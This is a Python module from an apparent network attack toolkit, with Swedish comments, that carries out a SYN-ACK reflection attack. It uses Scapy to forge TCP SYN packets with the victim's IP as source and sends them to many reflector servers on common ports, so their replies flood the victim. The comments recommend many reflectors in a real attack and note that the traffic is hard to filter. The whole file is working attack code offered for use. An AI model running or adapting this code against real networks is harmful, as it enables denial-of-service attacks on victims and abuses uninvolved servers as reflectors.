# ==================== attacks/syn_ack_reflection_attack.py ====================
"""
SYN-ACK Reflection Attack
Spoofar source till victim, får många servrar att svara med SYN-ACK
"""
from scapy.all import IP, TCP, Raw
import time
import random
from .base_attack import BaseAttack


class SYNACKReflectionAttack(BaseAttack):
    """SYN-ACK Reflection - Reflection attack using TCP handshake"""

    def get_attack_name(self):
        return "SYN-ACK Reflection"

    def execute(self, count=100, reflection_targets=None):
        """
        Kör SYN-ACK reflection attack
        reflection_targets: Lista med servrar att reflektera via
        """
        if reflection_targets is None:
            # Exempel targets (använd många servrar i verklig attack)
            reflection_targets = [
                f"192.168.1.{i}" for i in range(10, 50)  # 40 olika servrar
            ]

        self.print_header("SYN-ACK Reflection Attack", count=count)

        print("[*] SYN-ACK Reflection - Många servrar svarar till victim")
        print(f"[*] Använder {len(reflection_targets)} reflection-servrar")
        print(f"[*] Varje server skickar SYN-ACK till {self.target_ip}")

        self.start_time = time.time()
        self.packets_sent = 0

        # Vanliga öppna portar att prova
        common_ports = [80, 443, 22, 21, 25, 3389, 8080, 3306, 5432]

        for i in range(count):
            reflection_target = reflection_targets[i % len(reflection_targets)]
            target_port = common_ports[i % len(common_ports)]

            payload = f"{self.custom_message}_SYNACK_REFL_{i + 1}".encode()

            # Source spoofad till victim - reflector svarar till victim!
            packet = IP(src=self.target_ip, dst=reflection_target) / \
                     TCP(sport=random.randint(1024, 65535), dport=target_port,
                         flags="S",  # SYN
                         seq=random.randint(1000, 9000)) / \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] SYN-ACK Refl: {i + 1}/{count} SYN skickade ({pps:.1f} pps)")
                print(f"    → {len(reflection_targets)} servrar svarar med SYN-ACK till {self.target_ip}")

        self.log_attack("SYNACK_REFLECTION",
                        f"{count} reflected SYN packets, target: {self.target_ip}, reflectors: {len(reflection_targets)}")
        self.print_summary()

        print("\n[!] Varje reflection-server skickar SYN-ACK till victim")
        print("[!] Victim får SYN-ACK från servrar den aldrig kontaktade")
        print("[!] Svår att filtrera - ser ut som legitim trafik")
        print(f"[*] Totalt förväntat antal SYN-ACK till victim: ~{count}")
